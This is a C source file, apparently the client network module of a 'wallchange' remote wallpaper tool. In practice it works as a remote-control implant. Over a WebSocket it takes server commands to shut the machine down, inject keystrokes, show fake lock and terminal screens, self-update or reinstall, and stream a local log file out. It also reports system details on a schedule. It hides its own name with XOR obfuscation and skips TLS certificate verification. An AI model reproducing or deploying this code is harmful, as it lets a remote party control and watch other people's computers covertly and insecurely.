#define _POSIX_C_SOURCE 200809L
#include "client/network.h"
#include "client/utils.h"
#include "client/wallpaper.h"
#include "client/updater.h"
#include "client/keyboard.h"
#include "client/screen.h"
#include "mongoose.h"
#include "cJSON.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <ctype.h>

#define WS_URL_LOCAL "ws://localhost:8000"
#define WS_URL_REMOTE "wss://wallchange.codeky.fr"

static char ws_url_remote[128] = {0};
static char ws_client_secret[256] = {0};

static const char* get_ws_url_remote() {
    if (ws_url_remote[0] == 0) {
        snprintf(ws_url_remote, sizeof(ws_url_remote), "%s", WS_URL_REMOTE);
    }
    return ws_url_remote;
}

static int local_mode = 0;
static struct mg_mgr mgr;
static struct mg_connection *ws_conn = NULL;
static time_t last_connect_try = 0;
static time_t last_info_send = 0;
static time_t last_heartbeat_send = 0;
static char client_token[256] = {0};  // Token reçu du serveur
static const char *manual_token = NULL;  // Token manuel (env var)

static FILE *log_fp = NULL;
static char log_buffer[4096];
static size_t log_buffer_len = 0;
static long long last_log_flush_ms = 0;
// static int original_stderr = -1; // Unused
static int logging_enabled = 0;

static void load_token_from_file(void);

static char *get_log_file_path() {
    static char path[1024];
    const char *home = getenv("HOME");
    if (home) {
        // Decode "wallchange" at runtime (XOR 0x37)
        static const unsigned char _e[] = {
            0x40,0x56,0x5b,0x5b,0x54,0x5f,0x56,0x59,0x50,0x52,0x00
        };
        char _n[16]; size_t _i;
        for (_i = 0; _i < sizeof(_e) - 1; _i++) _n[_i] = (char)(_e[_i] ^ 0x37);
        _n[sizeof(_e) - 1] = '\0';
        snprintf(path, sizeof(path), "%s/.local/state/%s/client.log", home, _n);
        return path;
    }
    return NULL;
}

// Fonction pour commencer la lecture du fichier de log
static void start_log_capture() {
    if (logging_enabled) return;
    
    char *path = get_log_file_path();
    if (!path) return;
    
    log_fp = fopen(path, "r");
    if (!log_fp) {
        // Le fichier n'existe peut-être pas encore, attendons
        printf("Log file not found at %s\n", path);
        return;
    }
    
    // Si on veut vraiment "tout" partager, on commence au début.
    // Mais si le fichier est énorme, attention.
    // Supposons que c'est gérable ou que l'admin le veut.
    rewind(log_fp);
    
    logging_enabled = 1;
    printf("Log capture started from file: %s\n", path);
}

static void stop_log_capture() {
    if (!logging_enabled) return;
    
    if (log_fp) {
        fclose(log_fp);
        log_fp = NULL;
    }
    
    logging_enabled = 0;
    // printf("Log capture stopped.\n"); // Avoid writing to log about log stopping which might confuse tail?
}
// pipe code cleanup


// Fonction de log personnalisée pour Mongoose pour éviter la boucle infinie
static void mg_log_wrapper(char ch, void *param) {
    putchar(ch);
}

static int url_encode_component(const char *input, char *output, size_t output_size) {
    static const char hex[] = "0123456789ABCDEF";
    size_t out = 0;

    if (!input || !output || output_size == 0) return 0;

    for (size_t i = 0; input[i] != '\0'; i++) {
        unsigned char ch = (unsigned char) input[i];
        int safe = isalnum(ch) || ch == '-' || ch == '_' || ch == '.' || ch == '~';

        if (safe) {
            if (out + 1 >= output_size) return 0;
            output[out++] = (char) ch;
        } else {
            if (out + 3 >= output_size) return 0;
            output[out++] = '%';
            output[out++] = hex[(ch >> 4) & 0xF];
            output[out++] = hex[ch & 0xF];
        }
    }

    if (out >= output_size) return 0;
    output[out] = '\0';
    return 1;
}

static const char* get_effective_token(void) {
    const char *token = manual_token;
    if (!token || token[0] == '\0') {
        if (client_token[0] == '\0') {
            load_token_from_file();
        }
        token = client_token;
    }
    return token;
}

static int run_execvp(char *const argv[]) {
    pid_t pid = fork();
    if (pid < 0) return -1;

    if (pid == 0) {
        execvp(argv[0], argv);
        _exit(127);
    }

    int status = 0;
    if (waitpid(pid, &status, 0) < 0) return -1;
    if (!WIFEXITED(status)) return -1;
    return WEXITSTATUS(status);
}

static int run_execvp_capture(char *const argv[], char *output, size_t output_size) {
    int pipefd[2];
    if (pipe(pipefd) != 0) return -1;

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvp(argv[0], argv);
        _exit(127);
    }

    close(pipefd[1]);
    if (output && output_size > 0) {
        size_t total = 0;
        ssize_t n = 0;
        while ((n = read(pipefd[0], output + total, output_size - 1 - total)) > 0) {
            total += (size_t) n;
            if (total >= output_size - 1) break;
        }
        output[total] = '\0';
    } else {
        char discard[256];
        while (read(pipefd[0], discard, sizeof(discard)) > 0) {}
    }
    close(pipefd[0]);

    int status = 0;
    if (waitpid(pid, &status, 0) < 0) return -1;
    if (!WIFEXITED(status)) return -1;
    return WEXITSTATUS(status);
}

static int add_auth_args(char **argv, int idx, char *auth_header, size_t auth_header_size) {
    const char *token = get_effective_token();
    if (token && token[0] != '\0') {
        snprintf(auth_header, auth_header_size, "Authorization: Bearer %s", token);
        argv[idx++] = "-H";
        argv[idx++] = auth_header;
    }
    return idx;
}

// Chemin du fichier de token
static char* get_token_file_path() {
    static char path[512];
    char *username = get_username();
    char _tf[32];
    {
        static const unsigned char _e[] = {
            0x40,0x56,0x5b,0x5b,0x54,0x5f,0x56,0x59,
            0x50,0x52,0x68,0x43,0x58,0x5c,0x52,0x59,0x00
        };
        size_t _i;
        for (_i = 0; _i < sizeof(_e) - 1; _i++) _tf[_i] = (char)(_e[_i] ^ 0x37);
        _tf[sizeof(_e) - 1] = '\0';
    }
    snprintf(path, sizeof(path), "/home/%s/.%s", username, _tf);
    free(username);
    return path;
}

// Sauvegarde le token dans un fichier
static void save_token_to_file(const char *token) {
    FILE *fp = fopen(get_token_file_path(), "w");
    if (fp) {
        fprintf(fp, "%s", token);
        fclose(fp);
        chmod(get_token_file_path(), 0600);  // Lecture/écriture propriétaire uniquement
    }
}

// Charge le token depuis le fichier
static void load_token_from_file() {
    FILE *fp = fopen(get_token_file_path(), "r");
    if (fp) {
        if (fgets(client_token, sizeof(client_token), fp)) {
            // Supprimer le retour à la ligne si présent
            size_t len = strlen(client_token);
            if (len > 0 && client_token[len-1] == '\n') {
                client_token[len-1] = '\0';
            }
        }
        fclose(fp);
    }
}

// Retourne l'URL du serveur en fonction du mode
static const char* get_ws_url() {
    return local_mode ? WS_URL_LOCAL : get_ws_url_remote();
}

void set_admin_token(const char *token) {
    manual_token = token;
}

static const char* get_auth_header() {
    static char header[512];
    // Priorité: token manuel > token reçu du serveur > token fichier
    const char *token = manual_token;
    if (!token || strlen(token) == 0) {
        if (client_token[0] == '\0') {
            load_token_from_file();  // Charger depuis fichier si pas en mémoire
        }
        token = client_token;
    }
    if (token && strlen(token) > 0) {
        snprintf(header, sizeof(header), "-H \"Authorization: Bearer %s\"", token);
        return header;
    }
    return "";
}

void set_local_mode(int enabled) {
    local_mode = enabled;
    if (enabled) {
        printf("Mode local activé (localhost:8000)\n");
    }
}

// Compare deux versions (v1, v2). Retourne:
// -1 si v1 < v2
//  0 si v1 == v2
//  1 si v1 > v2
static int compare_versions(const char *v1, const char *v2) {
    int v1_major = 0, v1_minor = 0, v1_patch = 0;
    int v2_major = 0, v2_minor = 0, v2_patch = 0;
    
    sscanf(v1, "%d.%d.%d", &v1_major, &v1_minor, &v1_patch);
    sscanf(v2, "%d.%d.%d", &v2_major, &v2_minor, &v2_patch);
    
    if (v1_major < v2_major) return -1;
    if (v1_major > v2_major) return 1;
    
    if (v1_minor < v2_minor) return -1;
    if (v1_minor > v2_minor) return 1;
    
    if (v1_patch < v2_patch) return -1;
    if (v1_patch > v2_patch) return 1;
    
    return 0;
}

// Vérifie la version du serveur et met à jour si nécessaire
void check_and_update_version(const char *client_version) {
    char http_url[512];
    const char *ws_url = get_ws_url();
    
    // Construire l'URL HTTP
    if (strncmp(ws_url, "ws://", 5) == 0) {
        snprintf(http_url, sizeof(http_url), "http%s", ws_url + 2);
    } else if (strncmp(ws_url, "wss://", 6) == 0) {
        snprintf(http_url, sizeof(http_url), "https%s", ws_url + 3);
    } else {
        strncpy(http_url, ws_url, sizeof(http_url));
    }

    // Récupérer la version du serveur
    char command[2048];
    snprintf(command, sizeof(command), 
             "curl -s \"%s/api/version\"", http_url);
    
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        return; // Échec silencieux si impossible de vérifier
    }
    
    char server_version[32] = {0};
    if (fgets(server_version, sizeof(server_version), fp) != NULL) {
        // Supprimer le retour à la ligne
        size_t len = strlen(server_version);
        if (len > 0 && server_version[len-1] == '\n') {
            server_version[len-1] = '\0';
        }
        
        // Comparer les versions
        int cmp = compare_versions(client_version, server_version);
        
        if (cmp < 0) {
            // Client plus vieux que le serveur -> Mise à jour
            printf("⚠️  Nouvelle version disponible: %s (actuelle: %s)\n", 
                   server_version, client_version);
            printf("📦 Mise à jour automatique en cours...\n");
            pclose(fp);
            
            // Lancer la mise à jour
            perform_update();
            // Si on arrive ici, la mise à jour a échoué
            return;
        } else if (cmp > 0) {
            // Client plus récent que le serveur -> OK
            printf("✓ Version client (%s) plus récente que le serveur (%s). Pas de mise à jour nécessaire.\n", 
                   client_version, server_version);
        } else {
            // Versions identiques -> OK
            printf("✓ Version à jour: %s\n", client_version);
        }
    }
    
    pclose(fp);
}

// Traitement du message reçu
static void handle_message(const char *msg, size_t len) {
    // Ne pas afficher tout le JSON brut, on va parser et afficher proprement
    // printf("Message reçu: %.*s\n", (int)len, msg);

    cJSON *json = cJSON_ParseWithLength(msg, len);
    if (json == NULL) {
        printf("Erreur: JSON invalide: %.*s\n", (int)len, msg);
        return;
    }

    // Récupérer l'émetteur si disponible (pour les logs)
    const char *sender = "serveur";
    // NOTE: Actuellement le serveur n'envoie pas systématiquement le champ "from" sauf pour uninstall.
    // L'utilisateur demande "recu par qui".
    // Si la commande vient du serveur, c'est le serveur.
    // Mais le serveur pourrait relayer qui a demandé. 
    // Pour l'instant on regarde s'il y a un champ "from".
    cJSON *from_item = cJSON_GetObjectItemCaseSensitive(json, "from");
    if (cJSON_IsString(from_item) && from_item->valuestring) {
        sender = from_item->valuestring;
    }
    
    // Pour l'auth, on ne log pas forcément "reçu de..." car c'est interne protocol
    // Vérifier si c'est un message d'authentification

    cJSON *type_item = cJSON_GetObjectItemCaseSensitive(json, "type");
    cJSON *command_item = cJSON_GetObjectItemCaseSensitive(json, "command");

    if (cJSON_IsString(type_item) && strcmp(type_item->valuestring, "auth") == 0) {
        // ...Auth logic...
        cJSON *token_item = cJSON_GetObjectItemCaseSensitive(json, "token");
        if (cJSON_IsString(token_item) && token_item->valuestring) {
            strncpy(client_token, token_item->valuestring, sizeof(client_token) - 1);
            save_token_to_file(client_token);
            printf("[Auth] Token reçu du serveur et sauvegardé\n");
        }
        cJSON_Delete(json);
        return;
    }

    if (cJSON_IsString(command_item) && (command_item->valuestring != NULL)) {
        printf("[Commande] Reçue de '%s': %s\n", sender, command_item->valuestring);
        
        if (strcmp(command_item->valuestring, "update") == 0) {
            cJSON_Delete(json);
            perform_update();
            return;
        }
        if (strcmp(command_item->valuestring, "screen_off") == 0) {
            int duration = 3;
            cJSON *dur_item = cJSON_GetObjectItemCaseSensitive(json, "duration");
            if (cJSON_IsNumber(dur_item)) {
                duration = dur_item->valueint;
            }
            cJSON_Delete(json);
            screen_off(duration);
            return;
        }
        if (strcmp(command_item->valuestring, "uninstall") == 0) {
            // Vérifier l'utilisateur qui demande la désinstallation
            cJSON *from_item = cJSON_GetObjectItemCaseSensitive(json, "from");
            char *current_user = get_username();
            
            // Autoriser seulement zakburak ou le même utilisateur
            int authorized = 0;
            if (from_item && cJSON_IsString(from_item) && from_item->valuestring != NULL) {
                if (strcmp(from_item->valuestring, "zakburak") == 0 || 
                    strcmp(from_item->valuestring, "web") == 0 || 
                    strcmp(from_item->valuestring, "admin") == 0 || 
                    strcmp(from_item->valuestring, current_user) == 0) {
                    authorized = 1;
                }
            }
            
            if (authorized) {
                printf("Commande de désinstallation autorisée de %s.\n", 
                       from_item->valuestring);
                cJSON_Delete(json);
                free(current_user);
                perform_uninstall();
                return;
            } else {
                printf("Commande de désinstallation refusée: utilisateur non autorisé.\n");
                cJSON_Delete(json);
                free(current_user);
                return;
            }
        }
        if (strcmp(command_item->valuestring, "reinstall") == 0) {
            printf("Commande de réinstallation reçue.\n");
            cJSON_Delete(json);
            perform_reinstall();
            return;
        }
        if (strcmp(command_item->valuestring, "showdesktop") == 0) {
            printf("Commande showdesktop reçue (Super+D).\n");
            simulate_show_desktop();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "reverse") == 0) {
            printf("Commande reverse reçue.\n");
            execute_reverse_screen();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "key") == 0) {
            cJSON *combo_item = cJSON_GetObjectItemCaseSensitive(json, "combo");
            if (cJSON_IsString(combo_item) && combo_item->valuestring != NULL) {
                printf("Commande key reçue: %s\n", combo_item->valuestring);
                simulate_key_combo(combo_item->valuestring);
            }
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "screen-off") == 0) {
            cJSON *duration_item = cJSON_GetObjectItemCaseSensitive(json, "duration");
            int duration = 3;
            if (cJSON_IsNumber(duration_item)) {
                duration = duration_item->valueint;
            }
            printf("Commande screen-off reçue (duration=%d)\n", duration);
            execute_screen_off(duration);
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "marquee") == 0) {
            cJSON *url_item = cJSON_GetObjectItemCaseSensitive(json, "url");
            if (cJSON_IsString(url_item) && url_item->valuestring != NULL) {
                printf("Commande marquee reçue: %s\n", url_item->valuestring);
                execute_marquee(url_item->valuestring);
            }
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "cover") == 0) {
            cJSON *url_item = cJSON_GetObjectItemCaseSensitive(json, "url");
            if (cJSON_IsString(url_item) && url_item->valuestring != NULL) {
                printf("Commande cover reçue: %s\n", url_item->valuestring);
                execute_cover(url_item->valuestring);
            }
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "particles") == 0) {
            cJSON *url_item = cJSON_GetObjectItemCaseSensitive(json, "url");
            if (cJSON_IsString(url_item) && url_item->valuestring != NULL) {
                printf("Commande particles reçue: %s\n", url_item->valuestring);
                execute_particles(url_item->valuestring);
            }
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "clones") == 0) {
            printf("Commande clones reçue\n");
            execute_clones();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "drunk") == 0) {
            printf("Commande drunk reçue\n");
            execute_drunk();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "faketerminal") == 0) {
            printf("Commande faketerminal reçue\n");
            execute_faketerminal();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "confetti") == 0) {
            cJSON *url_item = cJSON_GetObjectItemCaseSensitive(json, "url");
            const char *url = (cJSON_IsString(url_item) && url_item->valuestring) ? url_item->valuestring : NULL;
            printf("Commande confetti reçue: %s\n", url ? url : "(default)");
            execute_confetti(url);
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "spotlight") == 0) {
            printf("Commande spotlight reçue\n");
            execute_spotlight();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "textscreen") == 0) {
            cJSON *text_item = cJSON_GetObjectItemCaseSensitive(json, "text");
            const char *text = (cJSON_IsString(text_item) && text_item->valuestring) ? text_item->valuestring : NULL;
            printf("Commande textscreen reçue: %s\n", text ? text : "(default)");
            execute_textscreen(text);
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "wavescreen") == 0) {
            printf("Commande wavescreen reçue\n");
            execute_wavescreen();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "dvdbounce") == 0) {
            cJSON *url_item = cJSON_GetObjectItemCaseSensitive(json, "url");
            const char *url = (cJSON_IsString(url_item) && url_item->valuestring) ? url_item->valuestring : NULL;
            printf("Commande dvdbounce reçue\n");
            execute_dvdbounce(url);
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "fireworks") == 0) {
            printf("Commande fireworks reçue\n");
            execute_fireworks();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "lock") == 0) {
            printf("Commande lock reçue\n");
            execute_lock();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "blackout") == 0) {
            printf("Commande blackout reçue\n");
            execute_blackout();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "fakelock") == 0) {
            printf("Commande fakelock reçue\n");
            execute_fakelock();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "nyancat") == 0) {
            printf("Commande nyancat reçue\n");
            execute_nyancat();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "fly") == 0) {
            printf("Commande fly reçue\n");
            execute_fly();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "invert") == 0) {

            printf("Commande invert reçue\n");
            execute_invert();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "start_logs") == 0) {
            printf("Commande start_logs reçue.\n");
            start_log_capture();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "stop_logs") == 0) {
            printf("Commande stop_logs reçue.\n");
            stop_log_capture();
            cJSON_Delete(json);
            return;
        }
        if (strcmp(command_item->valuestring, "shutdown") == 0) {
            printf("Commande shutdown reçue du serveur !\n");
            cJSON_Delete(json);
            int ret = system("shutdown now");
            (void)ret;
            return;
        }
    }

    cJSON *url_item = cJSON_GetObjectItemCaseSensitive(json, "url");
    if (cJSON_IsString(url_item) && (url_item->valuestring != NULL)) {
        char *url = url_item->valuestring;
        printf("URL trouvée: %s\n", url);

        char *username = get_username();
        char filepath[512];
        time_t t = time(NULL);
        snprintf(filepath, sizeof(filepath), "/home/%s/Pictures/wallpaper_%ld.jpg", username, t);
        
        if (download_image(url, filepath)) {
            printf("Image téléchargée avec succès.\n");

            // Gestion des effets ("effect": "pixelate|blur|invert", "value": int)
            cJSON *effect_item = cJSON_GetObjectItemCaseSensitive(json, "effect");
            if (cJSON_IsString(effect_item) && effect_item->valuestring) {
                int val = 0;
                cJSON *val_item = cJSON_GetObjectItemCaseSensitive(json, "value");
                if (cJSON_IsNumber(val_item)) {
                    val = val_item->valueint;
                }
                apply_wallpaper_effect(filepath, effect_item->valuestring, val);
            }

            set_wallpaper(filepath);
        } else {
            printf("Erreur lors du téléchargement.\n");
        }
        free(username);
    }

    cJSON_Delete(json);
}

// Envoie les informations système au serveur via WebSocket
void send_client_info() {
    if (ws_conn == NULL) return;
    
    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "type", "info");
    cJSON_AddStringToObject(json, "hostname", get_hostname());
    cJSON_AddStringToObject(json, "os", get_os_info());
    cJSON_AddStringToObject(json, "uptime", get_uptime());
    cJSON_AddStringToObject(json, "cpu", get_cpu_load());
    cJSON_AddStringToObject(json, "ram", get_ram_usage());
    cJSON_AddStringToObject(json, "version", VERSION);
    
    char *json_str = cJSON_PrintUnformatted(json);
    if (json_str) {
        mg_ws_send(ws_conn, json_str, strlen(json_str), WEBSOCKET_OP_TEXT);
        free(json_str);
    }
    cJSON_Delete(json);
    
    last_info_send = time(NULL);
}

// Callback Mongoose
static void fn(struct mg_connection *c, int ev, void *ev_data) {
    if (ev == MG_EV_OPEN) {
        // Connexion TCP ouverte
    } else if (ev == MG_EV_CONNECT) {
        if (c->is_tls) {
            struct mg_tls_opts opts = {
                // .ca = mg_str("/etc/ssl/certs/ca-certificates.crt"),
                .name = mg_str(get_ws_url_remote() + 6)
            };
            mg_tls_init(c, &opts);
        }
    } else if (ev == MG_EV_WS_OPEN) {
        printf("Connexion WebSocket établie !\n");
        ws_conn = c;
        // Envoyer les infos système au serveur
        send_client_info();
    } else if (ev == MG_EV_WS_MSG) {
        struct mg_ws_message *wm = (struct mg_ws_message *) ev_data;
        handle_message(wm->data.buf, wm->data.len);
    } else if (ev == MG_EV_CLOSE) {
        if (ws_conn == c) {
            printf("Connexion WebSocket fermée.\n");
            ws_conn = NULL;
            stop_log_capture(); // Arrêter les logs si déconnecté
        }
    } else if (ev == MG_EV_ERROR) {
        printf("Erreur Mongoose: %s\n", (char *)ev_data);
    }
}

void connect_ws() {
    char *username = get_username();
    char url[1024];
    const char *ws_url = get_ws_url();

    if (ws_client_secret[0] == '\0') {
        const char *env_secret = getenv("WALLCHANGE_CLIENT_SECRET");
        if (env_secret && env_secret[0] != '\0') {
            strncpy(ws_client_secret, env_secret, sizeof(ws_client_secret) - 1);
            ws_client_secret[sizeof(ws_client_secret) - 1] = '\0';
        }
    }

    if (ws_client_secret[0] != '\0') {
        char secret_encoded[512];
        if (url_encode_component(ws_client_secret, secret_encoded, sizeof(secret_encoded))) {
            snprintf(url, sizeof(url), "%s/%s?auth=%s", ws_url, username, secret_encoded);
        } else {
            snprintf(url, sizeof(url), "%s/%s", ws_url, username);
        }
    } else {
        snprintf(url, sizeof(url), "%s/%s", ws_url, username);
    }
    free(username);

    printf("Tentative de connexion à %s...\n", url);
    mg_ws_connect(&mgr, url, fn, NULL, NULL);
    last_connect_try = time(NULL);  // Mettre à jour le timestamp
}

void init_network() {
    // Rediriger les logs Mongoose vers le stdout original pour éviter la boucle infinie
    // lors de la capture des logs
    mg_log_set(0); // Désactiver complètement les logs Mongoose (spam)
    mg_mgr_init(&mgr);
}

void cleanup_network() {
    mg_mgr_free(&mgr);
}

void network_poll(int timeout_ms) {
    mg_mgr_poll(&mgr, timeout_ms);

    // Lire les logs du fichier et les envoyer (avec buffering)
    if (logging_enabled && ws_conn != NULL && log_fp != NULL) {
        int is_eof = 0;
        
        // Essayer de lire autant que possible sans bloquer
        while (log_buffer_len < sizeof(log_buffer) - 1) {
            size_t bytes_to_read = sizeof(log_buffer) - 1 - log_buffer_len;
            size_t n = fread(log_buffer + log_buffer_len, 1, bytes_to_read, log_fp);

            if (n > 0) {
                log_buffer_len += n;
                // Si on a lu moins que demandé, on est probablement à la fin du fichier
                if (n < bytes_to_read) is_eof = 1;
            } else {
                // n == 0 (EOF ou erreur)
                clearerr(log_fp);
                is_eof = 1;
                break;
            }
        }

        // Logique d'envoi optimisée ("Smart Batching")
        // - Si le buffer est plein: on envoie tout de suite (débit maximum en lecture historique)
        // - Si le buffer n'est pas plein (EOF de fichier):
        //   - Si temps écoulé > 200ms OU newlines détectés: on envoie (réactivité temps réel)
        
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long long now_ms = now.tv_sec * 1000 + now.tv_nsec / 1000000;
        
        int buffer_full = (log_buffer_len > 2048);
        int time_elapsed = (now_ms - last_log_flush_ms > 200); // 200ms pour grouper un peu plus
        int has_newline = (memchr(log_buffer, '\n', log_buffer_len) != NULL);
        
        // CONDITION CRITIQUE:
        // Si on est en train de lire l'historique (pas EOF), on attend que le buffer soit plein
        // pour ne pas spammer des petits paquets à chaque ligne.
        // Si on est à EOF (mode tail), on envoie dès qu'on a une ligne ou que le temps passe.
        
        int should_send = 0;
        
        if (buffer_full) {
            should_send = 1;
        } else if (is_eof && log_buffer_len > 0) {
            // Mode temps réel (fin de fichier atteinte)
            if (time_elapsed || has_newline) {
                should_send = 1;
            }
        }

        if (should_send && log_buffer_len > 0) {
            // Optimisation: ne pas envoyer juste des retours à la ligne vides en boucle si le fichier a beaucoup d'espaces
            if (log_buffer_len == 1 && log_buffer[0] == '\n') {
                 // On peut ignorer si on veut éviter le spam de lignes vides, ou non.
            }
            log_buffer[log_buffer_len] = '\0';
            
            cJSON *json = cJSON_CreateObject();

            cJSON_AddStringToObject(json, "type", "log");
            cJSON_AddStringToObject(json, "data", log_buffer);
            char *json_str = cJSON_PrintUnformatted(json);
            if (json_str) {
                mg_ws_send(ws_conn, json_str, strlen(json_str), WEBSOCKET_OP_TEXT);
                free(json_str);
            }
            cJSON_Delete(json);
            
            log_buffer_len = 0;
            last_log_flush_ms = now_ms;
        }
    }

    // Reconnexion automatique
    if (ws_conn == NULL) {
        time_t now = time(NULL);
        if (now - last_connect_try > 5) {
            connect_ws();
            last_connect_try = now;
        }
    } else {
        time_t now = time(NULL);

        // Envoyer un heartbeat toutes les 10 secondes (avec état de verrouillage)
        if (now - last_heartbeat_send >= 10) {
            last_heartbeat_send = now;
            int locked = is_screen_locked();
            char hb[64];
            snprintf(hb, sizeof(hb), "{\"type\":\"heartbeat\",\"locked\":%s}",
                     locked ? "true" : "false");
            mg_ws_send(ws_conn, hb, strlen(hb), WEBSOCKET_OP_TEXT);
        }

        // Envoyer les infos système périodiquement (toutes les 60 secondes)
        if (now - last_info_send > 60) {
            send_client_info();
        }
    }
}

// Helper pour construire l'URL HTTP à partir de l'URL WS
static void build_http_url(char *http_url, size_t size) {
    const char *ws_url = get_ws_url();
    if (strncmp(ws_url, "ws://", 5) == 0) {
        snprintf(http_url, size, "http%s", ws_url + 2);
    } else if (strncmp(ws_url, "wss://", 6) == 0) {
        snprintf(http_url, size, "https%s", ws_url + 3);
    } else {
        strncpy(http_url, ws_url, size);
    }
}

int send_command(const char *arg1, const char *arg2) {
    const char *target_user = NULL;
    const char *image_source = NULL;
    int is_url = 0;

    // Détection intelligente des arguments
    if (strncmp(arg1, "http://", 7) == 0 || strncmp(arg1, "https://", 8) == 0) {
        image_source = arg1;
        target_user = arg2;
        is_url = 1;
    } else if (strncmp(arg2, "http://", 7) == 0 || strncmp(arg2, "https://", 8) == 0) {
        image_source = arg2;
        target_user = arg1;
        is_url = 1;
    } else if (access(arg1, F_OK) == 0) {
        image_source = arg1;
        target_user = arg2;
        is_url = 0;
    } else if (access(arg2, F_OK) == 0) {
        image_source = arg2;
        target_user = arg1;
        is_url = 0;
    } else {
        // Aucun fichier existant trouvé.
        // On essaie de deviner si l'un des args ressemble à un chemin
        if (strchr(arg1, '/') != NULL) {
             image_source = arg1;
             target_user = arg2;
        } else if (strchr(arg2, '/') != NULL) {
             image_source = arg2;
             target_user = arg1;
        } else {
             // Par défaut, on suppose que arg1 est l'image
             image_source = arg1;
             target_user = arg2;
        }
    }

    if (!is_url && access(image_source, F_OK) != 0) {
        printf("Erreur: Le fichier '%s' est introuvable.\n", image_source);
        return 1;
    }

    // Construction de l'URL HTTP du serveur
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char url_encoded[1536];
    char target_encoded[256];
    if (is_url) {
        if (!url_encode_component(image_source, url_encoded, sizeof(url_encoded)) ||
            !url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
            printf("Erreur: Paramètres trop longs ou invalides.\n");
            return 1;
        }

        printf("Envoi de l'URL %s à %s...\n", image_source, target_user);

        char full_url[4096];
        snprintf(full_url, sizeof(full_url), "%s/api/send?id=%s&url=%s", http_url, target_encoded, url_encoded);
        char auth_header[512] = {0};
        char *argv[8];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi.\n");
        return 1;
    } else {
        printf("Upload du fichier %s pour %s...\n", image_source, target_user);

        if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
            printf("Erreur: Paramètres trop longs ou invalides.\n");
            return 1;
        }

        char form_arg[1536];
        char full_url[4096];
        snprintf(form_arg, sizeof(form_arg), "file=@%s", image_source);
        snprintf(full_url, sizeof(full_url), "%s/api/upload?id=%s", http_url, target_encoded);

        char auth_header[512] = {0};
        char *argv[12];
        int i = 0;
        argv[i++] = "curl";
        argv[i++] = "-s";
        i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
        argv[i++] = "-F";
        argv[i++] = form_arg;
        argv[i++] = full_url;
        argv[i] = NULL;

        int ret = run_execvp(argv);
        if (ret == 0) {
            printf("\nCommande envoyée avec succès !\n");
            return 0;
        }
        printf("\nErreur lors de l'envoi.\n");
        return 1;
    }
}

int send_update_command(const char *target_user) {
    // Construction de l'URL HTTP du serveur
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    char target_encoded[256];
    if (!url_encode_component(target_user, target_encoded, sizeof(target_encoded))) {
        printf("Erreur: Paramètres invalides.\n");
        return 1;
    }
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/api/update?id=%s", http_url, target_encoded);

    printf("Envoi de la commande de mise à jour à %s...\n", target_user);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    if (ret == 0) {
        printf("\nCommande de mise à jour envoyée avec succès !\n");
        return 0;
    } else {
        printf("\nErreur lors de l'envoi de la commande de mise à jour.\n");
        return 1;
    }
}

int send_list_command() {
    // Construction de l'URL HTTP du serveur
    char http_url[512];
    build_http_url(http_url, sizeof(http_url));

    printf("Récupération de la liste des clients connectés...\n");
    char full_url[1024];
    snprintf(full_url, sizeof(full_url), "%s/api/list", http_url);
    char auth_header[512] = {0};
    char *argv[8];
    int i = 0;
    argv[i++] = "curl";
    argv[i++] = "-s";
    i = add_auth_args(argv, i, auth_header, sizeof(auth_header));
    argv[i++] = full_url;
    argv[i] = NULL;

    int ret = run_execvp(argv);
    printf("\n");
    return (ret == 0) ? 0 : 1;
}

int send_showdesktop_command(const char *target_user) {
    char http_url[512];
